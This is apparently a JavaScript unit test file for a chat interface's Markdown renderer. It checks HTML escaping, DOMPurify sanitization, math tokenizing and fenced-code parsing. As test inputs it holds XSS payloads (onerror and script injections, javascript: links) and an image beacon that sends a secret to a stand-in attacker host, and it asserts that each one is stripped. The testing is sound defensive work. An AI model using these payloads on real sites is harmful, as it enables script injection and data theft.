/* global window */
import assert from 'node:assert/strict';
import { before, describe, it } from 'node:test';
import { JSDOM } from 'jsdom';

/** @type {typeof import('../../src/js/render.js')} */
let render;

before(async () => {
  // DOMPurify binds to the global window at import time; provide a real DOM first.
  const dom = new JSDOM('<!doctype html><html><body></body></html>');
  globalThis.window = dom.window;
  globalThis.document = dom.window.document;
  render = await import('../../src/js/render.js');
  const { default: DOMPurify } = await import('dompurify');
  assert.equal(DOMPurify.isSupported, true, 'DOMPurify must run against a real DOM, otherwise sanitize() is a no-op');
});

describe('escapeHtml', () => {
  it('escapes markup and quotes and coerces non-strings', () => {
    assert.equal(render.escapeHtml(`<img src=x onerror="a('b')">&`), '&lt;img src=x onerror=&quot;a(&#39;b&#39;)&quot;&gt;&amp;');
    assert.equal(render.escapeHtml(null), '');
    assert.equal(render.escapeHtml(42), '42');
  });
});

describe('renderMarkdown', () => {
  it('removes scripts, event handlers and inline styles', () => {
    const html = render.renderMarkdown('Hi <script>alert(1)</script><b onclick="x()" style="color:red">bold</b>');
    assert.doesNotMatch(html, /<script|onclick|style=/i);
    assert.match(html, /<b>bold<\/b>/);
  });

  it('drops images (exfiltration beacons) and iframes', () => {
    const html = render.renderMarkdown('![x](https://attacker.example/?q=secret) <iframe src="https://x"></iframe><img src=x onerror=alert(1)>');
    assert.doesNotMatch(html, /<img|<iframe|attacker/i);
  });

  it('neutralizes javascript: and data: links but keeps https links safe', () => {
    const html = render.renderMarkdown('[a](javascript:alert(1)) [b](data:text/html,x) [c](https://example.com)');
    assert.doesNotMatch(html, /javascript:|data:text/i);
    assert.match(html, /<a href="https:\/\/example\.com" target="_blank" rel="noopener noreferrer nofollow">c<\/a>/);
  });

  it('strips data-* attributes so content cannot trigger delegated UI actions', () => {
    const html = render.renderMarkdown('<a data-action="clear-keys" data-arg="x" href="https://example.com">x</a><span data-change="change-engine">y</span>');
    assert.doesNotMatch(html, /data-action|data-arg|data-change/);
  });

  it('strips class/id attributes so content cannot restyle the UI', () => {
    const html = render.renderMarkdown('<div class="fixed inset-0" id="chatInput">x</div>');
    assert.doesNotMatch(html, /class=|id=/);
  });

  it('renders ordinary Markdown', () => {
    const html = render.renderMarkdown('# Titel\n\n* eins\n* zwei\n\n`code`');
    assert.match(html, /<h1>Titel<\/h1>/);
    assert.match(html, /<li>eins<\/li>/);
    assert.match(html, /<code>code<\/code>/);
  });
});

describe('escapeMarkdown', () => {
  it('prevents values from creating links, images, headings or HTML', () => {
    const value = '[click](javascript:alert(1)) ![i](https://x) # h <b>x</b>\nnext';
    const html = render.renderMarkdown(`* ${render.escapeMarkdown(value)}`);
    assert.doesNotMatch(html, /<a |<img|<h1|<b>/);
    assert.match(html, /\[click\]/);
  });
});

describe('sanitizeModelNames', () => {
  it('replaces provider and model identifiers with a neutral label', () => {
    assert.equal(render.sanitizeModelNames('HTTP 429 from Google Gemini 2.5 Flash'), 'HTTP 429 from AI model');
    assert.equal(render.sanitizeModelNames('[nvidia/nemotron-3.5-lightning:free] empty'), '[AI model] empty');
    assert.equal(render.sanitizeModelNames(''), '');
  });

  it('only replaces whole words', () => {
    const text = 'Philosophy, liquidity and llamas stay untouched.';
    assert.equal(render.sanitizeModelNames(text), text);
  });
});

describe('math tokenizer extension', () => {
  /** The plain form: what the sanitizer lets through, before the lazy chunk typesets anything. @param {string} markdown */
  const plain = (markdown) => render.renderMarkdown(markdown, { extras: false });
  /** @param {string} html */
  const math = (html) => [...html.matchAll(/<(span|div) class="(math-inline|math-display)">([^<]*)<\/\1>/g)].map((m) => `${m[2]}:${m[3]}`);

  it('protects $…$, $$…$$, \\(…\\) and \\[…\\] from marked', () => {
    const html = plain('Euler: $e^{i\\pi} + 1 = 0$ and \\(a_1^2\\), inline $$\\sum_i x_i$$.\n\n$$\n\\frac{a}{b}\n$$\n\n\\[\nx = 1\n\\]');
    assert.deepEqual(math(html), ['math-inline:e^{i\\pi} + 1 = 0', 'math-inline:a_1^2', 'math-display:\\sum_i x_i', 'math-display:\\frac{a}{b}', 'math-display:x = 1']);
    // marked read neither emphasis nor escapes inside the formulas.
    assert.doesNotMatch(html, /<em>|<strong>/);
  });

  it('keeps prices and ordinary dollar signs as text', () => {
    for (const text of ['It costs $5 and $10.', 'Between $5-$10 per unit.', 'Tickets: $7 (was $9), or $2 off.', 'A lone $ sign.', 'Escaped \\$x\\$ stays.']) {
      assert.deepEqual(math(plain(text)), [], text);
    }
    assert.deepEqual(math(plain('Costs $5, and $x$ is a variable.')), ['math-inline:x']);
  });

  it('never reads escaped values or plain parentheses as math', () => {
    const value = 'Report (2024) [Draft] a_b {x} \\path';
    const html = plain(`* ${render.escapeMarkdown(value)}\n* ${render.escapeMarkdown('[Draft]')}\n\nA \\(plain\\) aside.`);
    assert.deepEqual(math(html), []);
    assert.match(html, /<li>Report \(2024\) \[Draft\] a_b \{x\} \\path<\/li>/);
    assert.match(html, /<li>\[Draft\]<\/li>/);
    assert.match(html, /A \(plain\) aside\./);
  });

  it('leaves code untouched and keeps emphasis around a formula whole', () => {
    const html = plain('`$a$` and\n\n```\n$$x$$\n```\n\n*see $a*b$ here*');
    assert.match(html, /<code>\$a\$<\/code>/);
    assert.match(html, /<code>\$\$x\$\$\n<\/code>/);
    assert.match(html, /<em>see <span class="math-inline">a\*b<\/span> here<\/em>/);
  });

  it('escapes the TeX it keeps and does not let a stray $$ swallow the paragraphs after it', () => {
    const html = plain('$<img src=x onerror=alert(1)>$\n\n$$ open\n\nnext paragraph $$');
    assert.doesNotMatch(html, /<img/);
    assert.match(html, /<span class="math-inline">&lt;img src=x onerror=alert\(1\)&gt;<\/span>/);
    assert.equal(math(html).length, 1);
  });

  it('masks inline math for the emphasis search without changing its length', () => {
    const src = 'a *b $x*y$ c* \\(z_1*\\) $5 and $6';
    const masked = render.maskInlineMath(src);
    assert.equal(masked.length, src.length);
    assert.equal(masked, 'a *b $aaa$ c* \\(aaaa\\) $5 and $6');
  });
});

describe('fenced code', () => {
  /** @param {string} markdown */
  const plain = (markdown) => render.renderMarkdown(markdown, { extras: false });

  it('keeps the fence language and title, and no other class', () => {
    const html = plain('```Python title="hello world.py"\nprint("<hi>")\n```\n\n<code class="language-js">x</code> <span class="math-inline evil">y</span> <div class="math-inline">z</div> <p class="fixed">w</p>');
    assert.match(html, /^<pre title="hello world.py"><code class="language-python">print\("&lt;hi&gt;"\)\n<\/code><\/pre>/);
    // Outside <pre>, and on any other element or value, classes stay forbidden.
    const doc = new window.DOMParser().parseFromString(html, 'text/html');
    assert.deepEqual([...doc.querySelectorAll('[class]')].map((el) => `${el.tagName}.${el.className}`), ['CODE.language-python']);
  });

  it('reads language and title from the info string', () => {
    assert.deepEqual(render.parseFenceInfo('html title="Landing page"'), { language: 'html', title: 'Landing page' });
    assert.deepEqual(render.parseFenceInfo("md title='Notes'"), { language: 'md', title: 'Notes' });
    assert.deepEqual(render.parseFenceInfo('c++ title=main.cpp'), { language: 'c++', title: 'main.cpp' });
    assert.deepEqual(render.parseFenceInfo('<x"onload'), { language: 'xonload', title: '' });
    assert.deepEqual(render.parseFenceInfo(undefined), { language: '', title: '' });
  });

  it('recognizes TeX by its commands and structure', () => {
    for (const tex of ['\\alpha', 'x^2', 'a_1', '\\frac{a}{b}']) assert.equal(render.looksLikeTex(tex), true, tex);
    for (const text of ['x', '2024', 'a = b', 'a\\_b', 'draft \\+ notes', '\\\\path']) assert.equal(render.looksLikeTex(text), false, text);
  });
});
